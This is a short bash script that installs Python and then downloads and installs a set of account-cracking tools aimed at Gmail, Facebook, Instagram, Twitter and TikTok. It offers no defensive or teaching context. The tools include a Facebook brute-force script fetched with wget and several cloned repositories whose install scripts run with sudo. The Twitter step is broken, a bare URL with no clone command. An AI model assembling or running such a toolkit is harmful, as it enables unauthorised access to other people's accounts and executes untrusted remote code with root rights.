#!/bin/bash
#Sysupdate
sudo apt-get update
#Python
sudo apt-get install python
sudo apt-get install python3
sudo apt-get install python3-pip
sudo pip install bs4
#gmail
git clone https://github.com/Ha3MrX/Gemail-Hack.git
#facebook
if [ -d facebook ]; then
        echo "Directory facebook exists.[✔]"
else
	mkdir facebook
	cd facebook
	wget raw.githubusercontent.com/Sup3r-Us3r/scripts/master/fb-brute.pl
	cd ..
fi
#Instagram
git clone https://github.com/aladdin-pvt/instainsane.git
cd instainsane
chmod +x instainsane.sh
chmod +x install.sh
sudo ./install.sh
cd ..
#Twitter
https://github.com/Mehran/tweetshell.git
cd tweetshell
sudo chmod +x tweetshell.sh
sudo chmod +x install.sh
sudo ./install.sh
cd ..
#TikTok
git clone https://github.com/HAKR702/attack-TikTok.git
cd attack-TikTok
chmod +x TikTok.py
cd ..
